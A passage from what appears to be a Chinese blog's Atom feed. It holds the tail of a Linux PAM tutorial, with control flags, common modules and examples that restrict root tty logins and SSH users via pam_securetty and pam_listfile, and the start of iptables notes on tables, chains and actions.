x7528;&#x6237;&#x77E5;&#x9053;&#x88AB;&#x54EA;&#x4E2A;&#x6A21;&#x5757;&#x62D2;&#x7EDD;&#x3002;&#x5982;&#x679C;&#x5BF9;&#x7528;&#x6237;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6A21;&#x5757;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6210;&#x529F;&#x4FE1;&#x606F;&#x3002;</td></tr><tr><td>requisite</td><td>&#x4E0E;required&#x76F8;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x8FD4;&#x56DE;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x7ACB;&#x523B;&#x5411;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x5931;&#x8D25;&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7C7B;&#x578B;&#x5931;&#x8D25;&#x3002;&#x4E0D;&#x518D;&#x8FDB;&#x884C;&#x540E;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#x3002;</td></tr><tr><td>sufficient</td><td>&#x8868;&#x793A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;PAM&#x7ED3;&#x6784;&#x5C31;&#x7ACB;&#x523B;&#x8FD4;&#x56DE;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#x4FE1;&#x606F;&#xFF08;&#x5373;&#x4F7F;&#x524D;&#x9762;&#x6709;&#x6A21;&#x5757;fail&#x4E86;&#xFF0C;&#x4E5F;&#x4F1A;&#x628A;fail&#x7ED3;&#x679C;&#x5FFD;&#x7565;&#x6389;&#xFF09;&#xFF0C;&#x628A;&#x63A7;&#x5236;&#x6743;&#x4EA4;&#x56DE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;&#x540E;&#x9762;&#x7684;&#x5C42;&#x53E0;&#x6A21;&#x5757;&#x5373;&#x4F7F;&#x4F7F;&#x7528;requisite&#x6216;&#x8005;required&#x63A7;&#x5236;&#x6807;&#x5FD7;&#xFF0C;&#x4E5F;&#x4E0D;&#x518D;&#x6267;&#x884C;&#x3002;&#x5982;&#x679C;&#x9A8C;&#x8BC1;&#x5931;&#x8D25;&#xFF0C;sufficent&#x7684;&#x4F5C;&#x7528;&#x548C;optional&#x76F8;&#x540C;</td></tr><tr><td>optional</td><td>&#x8868;&#x793A;&#x5373;&#x4F7F;&#x672C;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x6A21;&#x5757;&#x9A8C;&#x8BC1;&#x5931;&#x8D25;&#xFF0C;&#x4E5F;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x63A5;&#x53D7;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x63D0;&#x4F9B;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x4E00;&#x822C;&#x8FD4;&#x56DE;PAM_IGNORE&#xFF08;&#x5FFD;&#x7565;&#xFF09;</td></tr></tbody></table><h3 id="3-&#x6A21;&#x5757;&#x8DEF;&#x5F84;"><a href="#3-&#x6A21;&#x5757;&#x8DEF;&#x5F84;" class="headerlink" title="3. &#x6A21;&#x5757;&#x8DEF;&#x5F84;"></a>3. &#x6A21;&#x5757;&#x8DEF;&#x5F84;</h3><p>&#x6A21;&#x5757;&#x8DEF;&#x5F84;.&#x5373;&#x8981;&#x8C03;&#x7528;&#x6A21;&#x5757;&#x7684;&#x4F4D;&#x7F6E;. &#x5982;&#x679C;&#x662F;64&#x4F4D;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E00;&#x822C;&#x4FDD;&#x5B58;&#x5728;/lib64/security,&#x5982;: pam_unix.so<br>&#x540C;&#x4E00;&#x4E2A;&#x6A21;&#x5757;,&#x53EF;&#x4EE5;&#x51FA;&#x73B0;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7C7B;&#x578B;&#x4E2D;.&#x5B83;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7C7B;&#x578B;&#x4E2D;&#x6240;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x4E0D;&#x76F8;&#x540C;.&#x8FD9;&#x662F;&#x7531;&#x4E8E;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;<br>&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;,&#x7F16;&#x5236;&#x4E86;&#x4E0D;&#x540C;&#x7684;&#x6267;&#x884C;&#x51FD;&#x6570;.</p><h3 id="4-&#x6A21;&#x5757;&#x53C2;&#x6570;"><a href="#4-&#x6A21;&#x5757;&#x53C2;&#x6570;" class="headerlink" title="4. &#x6A21;&#x5757;&#x53C2;&#x6570;"></a>4. &#x6A21;&#x5757;&#x53C2;&#x6570;</h3><p>&#x6A21;&#x5757;&#x53C2;&#x6570;,&#x5373;&#x4F20;&#x9012;&#x7ED9;&#x6A21;&#x5757;&#x7684;&#x53C2;&#x6570;.&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;,&#x4E4B;&#x95F4;&#x7528;&#x7A7A;&#x683C;&#x5206;&#x9694;&#x5F00;,&#x5982;:<br>password   required   pam_unix.so nullok obscure min=4 max=8 md5</p><h3 id="5-&#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD;"><a href="#5-&#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD;" class="headerlink" title="5. &#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD;"></a>5. &#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD;</h3><table><thead><tr><th>PAM&#x6A21;&#x5757;</th><th>&#x7ED3;&#x5408;&#x7BA1;&#x7406;&#x7C7B;&#x578B;</th><th>&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>pam_unix.so</td><td>auth</td><td>&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5E76;&#x4E0E;/ec/shadow&#x6587;&#x4EF6;&#x76F8;&#x6BD4;&#x5BF9;&#x3002;&#x5339;&#x914D;&#x8FD4;&#x56DE;0</td></tr><tr><td>-</td><td>account</td><td>&#x68C0;&#x67E5;&#x7528;&#x6237;&#x7684;&#x8D26;&#x6237;&#x4FE1;&#x606F;&#xFF08;&#x5305;&#x62EC;&#x662F;&#x5426;&#x8FC7;&#x671F;&#x7B49;&#xFF09;&#x3002;&#x8D26;&#x6237;&#x53EF;&#x7528;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;0.</td></tr><tr><td>-</td><td>password</td><td>&#x4FEE;&#x6539;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x5C06;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x4F5C;&#x4E3A;&#x7528;&#x6237;&#x7684;&#x65B0;&#x5BC6;&#x7801;&#x66F4;&#x65B0;shadow&#x6587;&#x4EF6;</td></tr><tr><td>pam_shells.so</td><td>auth</td><td>&#x5982;&#x679C;&#x7528;&#x6237;&#x5411;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x7684;shell&#x5FC5;&#x987B;&#x662F;&#x5728;/etc/shells&#x6587;&#x4EF6;&#x4E2D;&#x4E4B;&#x4E00;&#x7684;shell</td></tr><tr><td>-</td><td>account</td><td></td></tr><tr><td>pam_deny.so</td><td>account</td><td>&#x8BE5;&#x6A21;&#x5757;&#x7528;&#x7528;&#x4E8E;&#x62D2;&#x7EDD;&#x8BBF;&#x95EE;</td></tr><tr><td>-</td><td>auth</td><td></td></tr><tr><td>-</td><td>password</td><td></td></tr><tr><td>-</td><td>session</td><td></td></tr><tr><td>pam_permit.so</td><td>auth</td><td>&#x8BE5;&#x6A21;&#x5757;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x90FD;&#x8FD4;&#x56DE;&#x6210;&#x529F;</td></tr><tr><td>-</td><td>account</td><td></td></tr><tr><td>-</td><td>session</td><td></td></tr><tr><td>pam_securetty.so</td><td>auth</td><td>&#x5982;&#x679C;&#x7528;&#x6237;&#x8981;&#x4EE5;root&#x767B;&#x5F55;&#x65F6;&#xFF0C;&#x5219;&#x767B;&#x5F55;&#x7684;tty&#x5FC5;&#x987B;&#x5728;/etc/securetty&#x4E4B;&#x4E2D;</td></tr><tr><td>pam_listfile.so</td><td>auth</td><td>&#x8BBF;&#x95EE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x63A7;&#x5236;&#x5F00;&#x5173;</td></tr><tr><td>-</td><td>account</td><td></td></tr><tr><td>-</td><td>password</td><td></td></tr><tr><td>-</td><td>session</td><td></td></tr><tr><td>pam_cracklib.so</td><td>password</td><td>&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x53EF;&#x4EE5;&#x63D2;&#x5165;&#x5230;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#x7684;&#x5BC6;&#x7801;&#x6808;&#x4E2D;&#xFF0C;&#x7528;&#x4E8E;&#x68C0;&#x67E5;&#x5BC6;&#x7801;&#x7684;&#x5F3A;&#x5EA6;&#x3002;</td></tr><tr><td>pam_limits.so</td><td>session</td><td>&#x5B9A;&#x4E49;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#x4E0A;&#x9650;&#xFF0C;root&#x7528;&#x6237;&#x4E5F;&#x4F1A;&#x53D7;&#x6B64;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;/etc/security/limits.conf&#x6216;/etc/security/limits.d/*.conf&#x6765;&#x8BBE;&#x5B9A;</td></tr></tbody></table><h3 id="4-&#x5B9E;&#x4F8B;"><a href="#4-&#x5B9E;&#x4F8B;" class="headerlink" title="4. &#x5B9E;&#x4F8B;"></a>4. &#x5B9E;&#x4F8B;</h3><p>1&#x3001;pam_securetty.so</p><p>&#x9650;&#x5236;root&#x4ECE;tty1,tty2&#xFF0C;tty5&#x767B;&#x5F55;&#xFF08;&#x65E0;&#x5B9E;&#x9645;&#x610F;&#x4E49;&#xFF0C;&#x53EA;&#x662F;&#x6F14;&#x793A;pam_securetty&#x7684;&#x7528;&#x6CD5;&#xFF09;<br>&#x5728;<code>/etc/pam.d/login</code>&#x4E2D;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4E00;&#x884C;</p><pre><code>auth    required    pam_securetty.so</code></pre><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072145957.png" alt=""></p><p>&#x5728;/etc/securetty&#x4E2D;&#x5C06;tty1&#x3001;tty2&#x3001;tty5&#x6CE8;&#x91CA;&#x5373;&#x53EF;<br><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072145318.png" alt=""></p><p>&#x4E4B;&#x540E;&#x4F7F;&#x7528;root&#x7528;&#x6237;&#x518D;&#x6B21;&#x767B;&#x5F55;&#xFF0C;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;</p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072145698.png" alt=""></p><p>&#x8FD9;&#x4E48;&#x505A;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x662F;&#x53EA;&#x9650;&#x5236;root&#x7528;&#x6237;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x5B83;&#x7528;&#x6237;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x6765;&#x9650;&#x5B9A;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x4F7F;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x6765;&#x589E;&#x5F3A;&#x4E00;&#x4E0B;&#x5B89;&#x5168;&#x6027;&#x3002;</p><hr><p>2&#x3001;pam_listfile.so</p><p>&#x4EC5;jaking1&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;ssh&#x8FDC;&#x7A0B;&#x767B;&#x5F55;<br>&#x5728;/etc/pam.d/sshd&#x6587;&#x4EF6;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761;</p><pre><code>auth    required    pam_listfile.so item=user   sense=allow file=/etc/sshdusers onerr=succeed</code></pre><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072145551.png" alt=""></p><p>&#x6DFB;&#x52A0;&#x4E24;&#x4E2A;&#x7528;&#x6237;jaking1&#x548C;jaking2&#x5E76;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;</p><pre><code>useradd jaking1useradd jaking2echo jaking666 | passwd --stdin jaking1echo jaking666 | passwd --stdin jaking2</code></pre><p>&#x7F16;&#x8F91;file&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x6DFB;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;&#x7528;&#x6237;jaking1</p><pre><code>echo &quot;jaking1&quot; &gt; /etc/sshduserscat /etc/sshdusers</code></pre><p>&#x4F7F;&#x7528;jaking2&#x7528;&#x6237;&#x767B;&#x5F55;<br>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5F53;&#x8F93;&#x5165;&#x6B63;&#x786E;&#x7684;&#x5BC6;&#x7801;&#x540E;&#x4F1A;&#x63D0;&#x793A;<br>&#x5C31;&#x50CF;&#x8F93;&#x5165;&#x4E86;&#x9519;&#x8BEF;&#x7684;&#x5BC6;&#x7801;&#x4E00;&#x6837;&#xFF0C;&#x800C;&#x5728;&#x4F7F;&#x7528;jaking1&#x7528;&#x6237;&#x767B;&#x5F55;&#x5219;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x62D2;&#x7EDD;&#x767B;&#x5F55;&#x7684;&#x63D0;&#x793A;<br>[root@VM2 ~]# ssh <a href="mailto:jaking2@192.168.10.11" target="_blank" rel="noopener">jaking2@192.168.10.11</a><br><a href="mailto:jaking2@192.168.10.11" target="_blank" rel="noopener">jaking2@192.168.10.11</a>&#x2018;s password:<br>Permission denied, please try again.<br><a href="mailto:jaking2@192.168.10.11" target="_blank" rel="noopener">jaking2@192.168.10.11</a>&#x2018;s password:<br>Permission denied, please try again.<br><a href="mailto:jaking2@192.168.10.11" target="_blank" rel="noopener">jaking2@192.168.10.11</a>&#x2018;s password:<br>Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).<br>[root@VM2 ~]# ssh <a href="mailto:jaking1@192.168.10.11" target="_blank" rel="noopener">jaking1@192.168.10.11</a><br><a href="mailto:jaking1@192.168.10.11" target="_blank" rel="noopener">jaking1@192.168.10.11</a>&#x2018;s password:<br>Last login: Thu Aug 12 09:59:05 2021 from 192.168.10.12<br>[jaking1@VM1 ~]$<br>&#x6CE8;&#xFF1A;&#x6B64;&#x5904;&#x5982;&#x679C;root&#x4E5F;&#x4F7F;&#x7528;ssh&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#xFF0C;&#x4E5F;&#x4F1A;&#x53D7;&#x5230;pam_listfile.so&#x9650;&#x5236;&#x7684;&#x3002;<br>&#x5176;&#x5B9E;pam&#x6A21;&#x5757;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x5957;&#x8DEF;&#x90FD;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x5982;&#x60F3;&#x4E86;&#x89E3;&#x66F4;&#x591A;&#x7684;PAM&#x6A21;&#x5757;&#x7684;&#x7528;&#x6CD5;&#x8BF7;man modules</p><p>[root@VM2 ~]# ssh <a href="mailto:root@192.168.10.11" target="_blank" rel="noopener">root@192.168.10.11</a><br><a href="mailto:root@192.168.10.11" target="_blank" rel="noopener">root@192.168.10.11</a>&#x2018;s password:<br>Permission denied, please try again.<br><a href="mailto:root@192.168.10.11" target="_blank" rel="noopener">root@192.168.10.11</a>&#x2018;s password:<br>Permission denied, please try again.<br><a href="mailto:root@192.168.10.11" target="_blank" rel="noopener">root@192.168.10.11</a>&#x2018;s password:<br>Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).</p><p>&#x6E29;&#x99A8;&#x63D0;&#x793A;&#xFF1A;<br>&#x5982;&#x679C;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#xFF0C;Linux-PAM &#x53EF;&#x80FD;&#x4F1A;&#x6539;&#x53D8;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;&#x8FD9;&#x53D6;&#x51B3;&#x4E8E;&#x4F60;&#x81EA;&#x5DF1;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x4E0D;&#x5B89;&#x5168;(&#x5F00;&#x653E;&#x7CFB;&#x7EDF;)&#x548C;&#x7EDD;&#x5BF9;&#x5B89;&#x5168;(&#x62D2;&#x7EDD;&#x4EFB;&#x4F55;&#x8BBF;&#x95EE;)&#x3002;&#x901A;&#x5E38;&#xFF0C;Linux-PAM &#x5728;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x65F6;&#xFF0C;&#x503E;&#x5411;&#x4E8E;&#x540E;&#x8005;&#x3002;&#x4EFB;&#x4F55;&#x7684;&#x914D;&#x7F6E;&#x9519;&#x8BEF;&#x90FD;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x6574;&#x4E2A;&#x6216;&#x8005;&#x90E8;&#x5206;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#x3002;<br>&#x914D;&#x7F6E; Linux-PAM &#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x9047;&#x5230;&#x6700;&#x5927;&#x7684;&#x95EE;&#x9898;&#x53EF;&#x80FD;&#x5C31;&#x662F; Linux-PAM &#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/pam.d/*&#x88AB;&#x5220;&#x9664;&#x4E86;&#x3002;&#x5982;&#x679C;&#x53D1;&#x751F;&#x8FD9;&#x79CD;&#x4E8B;&#x60C5;&#xFF0C;&#x4F60;&#x7684;&#x7CFB;&#x7EDF;&#x5C31;&#x4F1A;&#x88AB;&#x9501;&#x4F4F;&#x3002;<br>&#x6709;&#x529E;&#x6CD5;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6062;&#x590D;&#xFF0C;&#x6700;&#x597D;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x7528;&#x4E00;&#x4E2A;&#x5907;&#x4EFD;&#x7684;&#x955C;&#x50CF;&#x6765;&#x6062;&#x590D;&#x7CFB;&#x7EDF;&#xFF0C;&#x6216;&#x8005;&#x767B;&#x5F55;&#x8FDB;&#x5355;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x6B63;&#x786E;&#x7684;&#x914D;&#x7F6E;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&amp;#x4E00;&amp;#x3001;pam&amp;#x7B80;&amp;#x4ECB;&quot;&gt;&lt;a href=&quot;#&amp;#x4E00;&amp;#x3001;pam&amp;#x7B80;&amp;#x4ECB;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x4E00;&amp;#x3001;pam&amp;#x
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iptables学习笔记</title>
    <link href="https://marnm.github.io//posts/57bbf635/"/>
    <id>https://marnm.github.io//posts/57bbf635/</id>
    <published>2022-06-07T04:53:37.000Z</published>
    <updated>2022-06-07T05:02:18.523Z</updated>
    
    <content type="html"><![CDATA[<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><h3 id="iptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE;"><a href="#iptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE;" class="headerlink" title="iptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE;"></a>iptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE;</h3><blockquote><p>iptables&#x7684;&#x7ED3;&#x6784;&#x662F;&#x7531;talbes&#x7EC4;&#x6210;&#xFF0C;&#x800C;tables&#x662F;&#x7531;&#x94FE;&#x7EC4;&#x6210;&#xFF0C;&#x94FE;&#x53C8;&#x662F;&#x7531;&#x5177;&#x4F53;&#x7684;&#x89C4;&#x5219;&#x7EC4;&#x6210;&#x3002;<br>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5728;&#x7F16;&#x5199;iptables&#x7684;&#x89C4;&#x5219;&#x65F6;&#xFF0C;&#x8981;&#x5148;&#x6307;&#x5B9A;&#x8868;&#xFF0C;&#x518D;&#x6307;&#x5B9A;&#x94FE;&#x3002;<br>tables&#x7684;&#x4F5C;&#x7528;&#x662F;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x529F;&#x80FD;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x5E76;&#x4E14;&#x5B58;&#x50A8;&#x8FD9;&#x4E9B;&#x89C4;&#x5219;&#x3002;</p></blockquote><table><thead><tr><th>&#x8868;&#x540D;</th><th>&#x529F;&#x80FD;</th><th>&#x4F18;&#x5148;&#x7EA7;&#xFF08;&#x4F4E;&#x2013;&gt;&#x9AD8;&#xFF09;</th><th>&#x5185;&#x5EFA;&#x94FE;</th></tr></thead><tbody><tr><td>filter</td><td>&#x8D1F;&#x8D23;&#x6570;&#x636E;&#x5305;&#x7684;&#x8FC7;&#x6EE4;&#x529F;&#x80FD;&#xFF0C;&#x9632;&#x706B;&#x5899;&#xFF1B;&#x5185;&#x6838;&#x6A21;&#x5757;&#xFF1A;iptables_filter</td><td>4</td><td>INPUT&#x3001; OUTPUT&#x3001; FORWARD</td></tr><tr><td>nat</td><td>&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x529F;&#x80FD;&#xFF1B;&#x5185;&#x6838;&#x6A21;&#x5757;&#xFF1A;iptable_nat</td><td>3</td><td>PREROUTING &#x3001;POSTROUTING&#x3001; OUTPUT</td></tr><tr><td>mangle</td><td>&#x62C6;&#x89E3;&#x62A5;&#x6587;&#xFF0C;&#x505A;&#x51FA;&#x4FEE;&#x6539;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x7EC4;&#x88C5;&#x6210;&#x6570;&#x636E;&#x5305;&#x7684;&#x529F;&#x80FD;&#xFF0C;iptable_mangle</td><td>2</td><td>PREROUTING&#x3001; OUTPUT&#x3001; FORWARD&#x3001; INPUT&#x3001; POSTROUTING</td></tr><tr><td>raw</td><td>&#x6570;&#x636E;&#x8DDF;&#x8E2A;&#xFF0C;&#x5173;&#x95ED;nat&#x8868;&#x4E0A;&#x542F;&#x7528;&#x7684;&#x8FDE;&#x63A5;&#x8FFD;&#x8E2A;&#x673A;&#x5236;&#xFF1B;table_raw</td><td>1</td><td>PREROUTING &#x3001;OUTPUT</td></tr></tbody></table><p><em>&#x89C4;&#x5219;&#x94FE;</em></p><table><thead><tr><th>&#x94FE;&#x7C7B;&#x578B;</th><th>&#x4F5C;&#x7528;&#x57DF;</th></tr></thead><tbody><tr><td>PREROUTING</td><td>&#x6570;&#x636E;&#x5305;&#x8FDB;&#x5165;&#x8DEF;&#x7531;&#x8868;&#x4E4B;&#x524D;</td></tr><tr><td>INPUT</td><td>&#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x540E;&#x76EE;&#x7684;&#x5730;&#x4E3A;&#x672C;&#x673A;</td></tr><tr><td>OUTPUT</td><td>&#x7531;&#x672C;&#x673A;&#x4EA7;&#x751F;&#xFF0C;&#x5411;&#x5916;&#x8F6C;&#x53D1;</td></tr><tr><td>FORWARD</td><td>&#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x540E;&#xFF0C;&#x76EE;&#x7684;&#x5730;&#x4E0D;&#x4E3A;&#x672C;&#x673A;</td></tr><tr><td>POSTROUTING</td><td>&#x53D1;&#x9001;&#x5230;&#x7F51;&#x5361;&#x63A5;&#x53E3;&#x4E4B;&#x524D;</td></tr></tbody></table><p><strong>&#x94FE;&#x8868;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x987A;&#x5E8F;&#xFF1A;</strong></p><ul><li>&#x8868;&#x95F4;&#x7684;&#x4F18;&#x5148;&#x987A;&#x5E8F;&#xFF1A;raw &gt; mangle &gt; nat &gt; filter</li><li>&#x94FE;&#x95F4;&#x7684;&#x4F18;&#x5148;&#x987A;&#x5E8F;&#xFF1A;<ul><li>&#x5165;&#x7AD9;&#x6570;&#x636E;&#xFF1A;PREROUTING &gt; INPUT</li><li>&#x51FA;&#x7AD9;&#x6570;&#x636E;&#xFF1A;OUTPUT &gt; POSTROUTING</li><li>&#x8F6C;&#x53D1;&#x6570;&#x636E;&#xFF1A;PREROUTING &gt; FORWARD &gt; POSTROUTING</li></ul></li><li>&#x94FE;&#x5185;&#x7684;&#x5339;&#x914D;&#x987A;&#x5E8F;&#xFF1A;<ul><li>&#x81EA;&#x9876;&#x5411;&#x4E0B;&#x6309;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#xFF0C;&#x627E;&#x5230;&#x5339;&#x914D;&#x7684;&#x89C4;&#x5219;&#x5373;&#x505C;&#x6B62;&#xFF08;LOG&#x9009;&#x9879;&#x8868;&#x793A;&#x8BB0;&#x5F55;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#xFF09;</li><li>&#x82E5;&#x5728;&#x8BE5;&#x94FE;&#x5185;&#x627E;&#x4E0D;&#x5230;&#x76F8;&#x5339;&#x914D;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x5219;&#x6309;&#x8BE5;&#x94FE;&#x7684;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#x5904;&#x7406;&#xFF08;&#x672A;&#x4FEE;&#x6539;&#x7684;&#x72B6;&#x51B5;&#x4E0B;&#xFF0C;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#x4E3A;&#x5141;&#x8BB8;&#xFF09;</li></ul></li></ul><p><strong>&#x5339;&#x914D;&#x6761;&#x4EF6;</strong></p><ul><li>&#x6E90;&#x5730;&#x5740;Source IP</li><li>&#x76EE;&#x6807;&#x5730;&#x5740;Destination IP</li></ul><p><strong>&#x5904;&#x7406;&#x52A8;&#x4F5C;</strong></p><ul><li>ACCEPT&#xFF1A;&#x5141;&#x8BB8;&#x6570;&#x636E;&#x5305;&#x901A;&#x8FC7;</li><li>DROP&#xFF1A;&#x76F4;&#x63A5;&#x4E22;&#x5F03;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x4E0D;&#x7ED9;&#x4EFB;&#x4F55;&#x56DE;&#x5E94;&#x4FE1;&#x606F;</li><li>REJECT&#xFF1A;&#x62D2;&#x7EDD;&#x6570;&#x636E;&#x5305;&#x901A;&#x8FC7;&#xFF0C;&#x5FC5;&#x8981;&#x65F6;&#x4F1A;&#x7ED9;&#x6570;&#x636E;&#x53D1;&#x9001;&#x7AEF;&#x4E00;&#x4E2A;&#x54CD;&#x5E94;&#x4FE1;&#x606F;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x521A;&#x8BF7;&#x6C42;&#x5C31;&#x4F1A;&#x6536;&#x5230;&#x62D2;&#x7EDD;&#x7684;&#x4FE1;&#x606F;&#x3002;</li><li>SNAT&#xFF1A;&#x6E90;&#x5730;&#x5740;&#x8F6C;&#x6362;&#xFF0C;&#x89E3;&#x51B3;&#x5185;&#x7F51;&#x7528;&#x6237;&#x7528;&#x540C;&#x4E00;&#x4E2A;&#x516C;&#x7F51;&#x5730;&#x5740;&#x4E0A;&#x7F51;&#x7684;&#x95EE;&#x9898;</li><li>MASQUERADE&#xFF1A;&#x662F;SNAT&#x7684;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x5F62;&#x5F0F;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x52A8;&#x6001;&#x3001;&#x4E34;&#x65F6;&#x4F1A;&#x53D8;&#x7684;IP&#x4E0A;</li><li>DNAT&#xFF1A;&#x76EE;&#x6807;&#x5730;&#x5740;&#x8F6C;&#x6362;</li><li>REDIRECT&#xFF1A;&#x5728;&#x672C;&#x673A;&#x505A;&#x7AEF;&#x53E3;&#x6620;&#x5C04;</li><li>LOG&#xFF1A;&#x5728;<code>/var/log/messages</code>&#x6587;&#x4EF6;&#x4E2D;&#x8BB0;&#x5F55;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6570;&#x636E;&#x5305;&#x4F20;&#x9012;&#x7ED9;&#x4E0B;&#x4E00;&#x6761;&#x89C4;&#x5219;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x9664;&#x4E86;&#x8BB0;&#x5F55;&#x4EE5